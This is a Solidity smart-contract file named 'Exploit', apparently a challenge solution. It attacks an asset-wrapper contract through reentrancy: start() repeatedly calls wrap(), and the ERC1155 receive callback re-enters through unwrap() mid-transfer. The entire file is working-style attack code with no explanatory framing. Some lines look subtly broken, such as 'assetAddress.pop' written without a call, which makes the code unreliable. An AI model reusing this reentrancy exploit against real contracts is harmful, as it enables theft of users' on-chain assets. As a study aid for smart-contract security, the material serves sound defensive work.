// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IAssertWrapper {
    function wrap(uint256 nftId, address assetOwner, address assetAddress) external;
    function unwrap(address assetOwner, address assetAddress) external;
}
contract Exploit {
    address[] internal assetAddress;
    IAssertWrapper internal wassert;
    constructor(address[2] memory _assetAddress, address assertWrapperAddress) {
        assetAddress = _assetAddress;
        wassert = IAssertWrapper(assertWrapperAddress);
    }

    function start() public 
    {
        uint8 execNum;
        while (execNum <= assetAddress.length) {
            wassert.wrap(0, address(this),  assetAddress[0]);
            execNum++;
        }
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual returns (bytes4) {
        wassert.unwrap(address(this), assetAddress[0]);
        assetAddress[0] = assetAddress[assetAddress.length - 1];
        assetAddress.pop;
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}